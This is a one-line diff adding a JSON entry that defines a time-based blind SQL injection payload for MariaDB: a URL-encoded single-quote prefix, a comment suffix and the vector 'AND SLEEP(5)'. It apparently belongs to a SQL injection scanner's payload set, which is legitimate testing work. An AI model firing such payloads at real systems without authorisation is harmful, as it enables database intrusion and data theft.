@@ -1,0 +1,1 @@
+{"dbms": "mariadb", "technique": "time", "boundary": {"prefix": "%27", "suffix": "-- -", "type": "single-enc"}, "vector": "{B} AND SLEEP(5)", "comment": "mariadb time: url-enc single"}
